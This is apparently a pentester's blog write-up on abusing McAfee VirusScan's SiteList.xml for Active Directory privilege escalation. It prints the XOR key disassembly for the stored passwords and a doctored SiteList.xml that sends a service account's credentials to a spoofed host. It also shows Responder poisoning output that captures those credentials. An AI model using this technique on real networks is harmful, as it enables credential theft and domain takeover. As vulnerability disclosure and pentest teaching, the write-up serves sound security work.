
#### McAfee privileged SiteList.xml leads to Active Directory domain privilege escalation

#### 16/02/2016 UPDATE

Thanks to [@funoverip](https://twitter.com/funoverip) for his [password decryption tool](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)

Thus for fun I tried to reverse the encryption process.

```
; Extract the XOR key
; \x12\x15\x0f\x10\x11\x1c\x1a\x06\x0a\x1f\x1b\x18\x17\x16\x05\x19\x00\x00\x00\x00
0x1001468e C645D812                        mov        byte [ss:ebp+var_28], 0x12
0x10014692 C645D915                        mov        byte [ss:ebp+var_27], 0x15
0x10014696 C645DA0F                        mov        byte [ss:ebp+var_26], 0xf
0x1001469a C645DB10                        mov        byte [ss:ebp+var_25], 0x10
0x1001469e C645DC11                        mov        byte [ss:ebp+var_24], 0x11
0x100146a2 C645DD1C                        mov        byte [ss:ebp+var_23], 0x1c
0x100146a6 C645DE1A                        mov        byte [ss:ebp+var_22], 0x1a
0x100146aa C645DF06                        mov        byte [ss:ebp+var_21], 0x6
0x100146ae C645E00A                        mov        byte [ss:ebp+var_20], 0xa
0x100146b2 C645E11F                        mov        byte [ss:ebp+var_1F], 0x1f
0x100146b6 C645E21B                        mov        byte [ss:ebp+var_1E], 0x1b
0x100146ba C645E318                        mov        byte [ss:ebp+var_1D], 0x18
0x100146be C645E417                        mov        byte [ss:ebp+var_1C], 0x17
0x100146c2 C645E516                        mov        byte [ss:ebp+var_1B], 0x16
0x100146c6 C645E605                        mov        byte [ss:ebp+var_1A], 0x5
0x100146ca C645E719                        mov        byte [ss:ebp+var_19], 0x19
0x100146ce C645D300                        mov        byte [ss:ebp+var_2D], 0x0
0x100146d2 C745C800000000                  mov        dword [ss:ebp+var_38], 0x0
0x100146d9 C745BC00000000                  mov        dword [ss:ebp+var_44], 0x0
0x100146e0 C745B400000000                  mov        dword [ss:ebp+var_4C], 0x0
0x100146e7 8B4D08                          mov        ecx, dword [ss:ebp+arg_0]
0x100146ea E811CCFEFF                      call       exp_?size@ABuffer@crypto@MA@mcafee_com@@QBEKXZ
```

#### 02/02/2016 UPDATE

According with [Intel Security response](https://kc.mcafee.com/corporate/index?page=content&id=KB86503) : this is not a security flaw in McAfee's product !

For best practices click [here](https://kc.mcafee.com/corporate/index?page=content&id=KB70999).

---

During an intern pentest, I came accross a nice way to privesc in an Active Directory domain.
I owned an employee's laptop with [**McAfee Virusscan Enterprise 8.8**](http://www.mcafee.com/us/products/virusscan-enterprise.aspx) installed and a low privilege account.

Mcafee has a feature to customize update servers and can connect to these servers via HTTP or SMB. (*C:\ProgramData\McAfee\Common Framework\*) **SiteList.xml** contains juicy informations like credentials, internal server names, ...

```
<?xml version="1.0" encoding="UTF-8"?>
<ns:SiteLists xmlns:ns="naSiteList" Type="Client">
<SiteList Default="1" Name="SomeGUID">

<HttpSite Type="fallback" Name="McAfeeHttp" Order="26" Enabled="1" Local="0" Server="update.nai.com:80">
<RelativePath>Products/CommonUpdater</RelativePath><UseAuth>0</UseAuth>
<UserName></UserName>
<Password Encrypted="1">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</Password>
</HttpSite>

<UNCSite Type="repository" Name="Paris" Order="13" Server="paris001" Enabled="1" Local="0">
<ShareName>Repository$</ShareName><RelativePath></RelativePath><UseLoggedonUserAccount>0</UseLoggedonUserAccount>
<DomainName>companydomain</DomainName>
<UserName>McAfeeService</UserName>
<Password Encrypted="1">YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</Password>
</UNCSite>

<UNCSite Type="repository" Name="Tokyo" Order="18" Server="tokyo000" Enabled="1" Local="0">
<ShareName>Repository$</ShareName><RelativePath></RelativePath><UseLoggedonUserAccount>0</UseLoggedonUserAccount>
<DomainName>companydomain</DomainName>
<UserName>McAfeeService</UserName>
<Password Encrypted="1">YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</Password>
</UNCSite>

</SiteList></ns:SiteLists>
```

Let's check which rights we got with **McAfeeService**.

```
PS C:\Users\TAirane> net user McAfeeService /domain
The request will be processed at a domain controller for domain companydomain. 

User name                     McAfeeService
Full Name                     McAfee ePO
Comment                       Service Account for ePO Replication
User's comment
Country/region code           000 (System Default)
Account active                Yes
Account expires               Never
Password last set             29/01/2007 16:03:12
Password expires              Never
Password changeable           29/01/2007 16:03:12
Password required             Yes
User may change password      Yes

Workstations allowed          All
Logon script
User profile
Home directory
Last logon                    29/01/2016 17:55:09

Logon hours allowed           All

Local Group Memberships       *All Repository*Repository
Global Group memberships      *Domain Services Account*Workstations Administrator
                              *Servers Administrator*Domain Users
                              
The command completed successfully. 
```

Unfortunately the AV used GUI password, I couldn't edit the file. Thus, I downloaded and installed McAfee on my Windows Virtual Machine and just copied/pasted the previous precious sesame in my own SiteList.xml.

At this time, I knew that It was close. I edited the file like I could force an HTTP connection to any random server that I could spoof using [**Responder**](https://github.com/SpiderLabs/Responder). Actually the SiteList.xml looks like this.

```
<?xml version="1.0" encoding="UTF-8"?>
<ns:SiteLists xmlns:ns="naSiteList" Type="Client">
<SiteList Default="1" Name="SomeGUID">

<HttpSite Type="fallback" Name="PWNED!" Order="26" Enabled="1" Local="0" Server="fuckingrandomserver:80">
<RelativePath>LICORNE</RelativePath><UseAuth>1</UseAuth>
<UserName>McAfeeService</UserName>
<Password Encrypted="1">YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</Password>
</HttpSite>

</SiteList></ns:SiteLists>
```

I clicked to update McAfee Antivirus and [Responder enters the matrix](https://www.youtube.com/watch?v=NEuZgK669zY).

```
root@kali:~/Tools/responder# python Responder.py -I eth0 --basic
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3

  Original work by Laurent Gaffie (lgaffie@trustwave.com)
  To kill this script hit CRTL-C
...
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [ON]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [ON]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.169.140]
    Challenge set              [1122334455667788]


[+] Listening for events...

[*] [LLMNR]  Poisoned answer sent to 192.168.169.141 for name fuckingrandomserver

[HTTP] Basic Client   : 192.168.169.141
[HTTP] Basic Username : McAfeeService
[HTTP] Basic Password : *\cool_its_a_strong_password/*
```

OMG, we got it ! Now, I can level up :) I can logon on any *Domain Controler* and access all workstations within the domain.

Mission accomplished !

![McAfee](img/McAfee.jpg)

[@tfairane](https://twitter.com/tfairane) greetz [@Fr33ster](https://twitter.com/Fr33ster)
